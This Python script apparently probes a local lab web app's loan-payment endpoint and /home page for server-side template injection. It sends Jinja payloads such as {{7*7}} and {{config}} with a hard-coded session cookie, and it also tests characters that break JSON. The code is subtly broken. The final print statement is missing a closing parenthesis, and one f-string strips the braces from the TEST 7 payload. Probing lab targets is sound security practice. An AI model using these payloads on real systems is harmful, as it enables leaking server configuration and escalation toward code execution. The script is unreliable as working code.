# Import required packages
import requests
import urllib.parse
import re
import json

# Base URL
base_url = "http://127.0.0.1:5000"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYTgQ.zxJDgrrGBVoUrTrnwwifgdf1QW0"

headers = {"Cookie": f"session={session_cookie}"}

print("\n[TEST 1] Normal request baseline")
params = {"loan_amount": "10000", "monthly_payment": "500", "months": "24"}
resp = requests.get(f"{base_url}/total_loan_payments", params=params, headers=headers)
print(f"Status: {resp.status_code}, Content-Type: {resp.headers.get('content-type')}")
print(f"Response body:\n{resp.text}")

print("\n[TEST 2] Direct SSTI payload: {{7*7}}")
params = {"loan_amount": "{{7*7}}", "monthly_payment": "500", "months": "24"}
resp = requests.get(f"{base_url}/total_loan_payments", params=params, headers=headers)
print(f"Status: {resp.status_code}\nResponse: {resp.text}")

print("\n[TEST 3] URL-encoded SSTI")
params = {"loan_amount": urllib.parse.quote("{{7*7}}"), "monthly_payment": "500", "months": "24"}
resp = requests.get(f"{base_url}/total_loan_payments", params=params, headers=headers)
print(f"Status: {resp.status_code}\nResponse: {resp.text}")

print("\n[TEST 4] Various SSTI syntax")
ssti_tests = ["{{7+7}}", "{{config}}", "{% print 7*7 %}", "{# comment #}{{7*7}}"]
for payload in ssti_tests:
    params = {"loan_amount": payload, "monthly_payment": "500", "months": "24"}
    resp = requests.get(f"{base_url}/total_loan_payments", params=params, headers=headers)
    print(f"Payload: {payload[:30]}... -> Status: {resp.status_code}")

print("\n[TEST 5] Filter on different parameters")
for param in ["loan_amount", "monthly_payment", "months"]:
    params = {param: "{{7*7}}", "loan_amount": "10000", "monthly_payment": "500", "months": "24"}
    resp = requests.get(f"{base_url}/total_loan_payments", params=params, headers=headers)
    print(f"Inject into {param}: Status {resp.status_code}")

print("\n[TEST 6] JSON validity check")
params = {"loan_amount": "10000", "monthly_payment": "500", "months": "24"}
resp = requests.get(f"{base_url}/total_loan_payments", params=params, headers=headers)
try:
    json.loads(resp.text)
    print("Response IS valid JSON")
except:
    print("Response IS NOT valid JSON")

print("\n[TEST 7] /home comparison")
resp = requests.get(f"{base_url}/home?test={{7*7}}", headers=headers)
print(f"/home with SSTI: Status {resp.status_code}")
if "49" in resp.text:
    print("CONFIRMED: /home evaluates SSTI")
else:
    print("No SSTI evaluation detected in response snippet")

print("\n[TEST 8] JSON breaking characters")
for char in ['"', "'", "\\", "{{"]:  
    params = {"loan_amount": f"100{char}00", "monthly_payment": "500", "months": "24"}
    resp = requests.get(f"{base_url}/total_loan_payments", params=params, headers=headers)
    print(f"Char '{char}': Status {resp.status_code}, Reflected: {char in resp.text}"
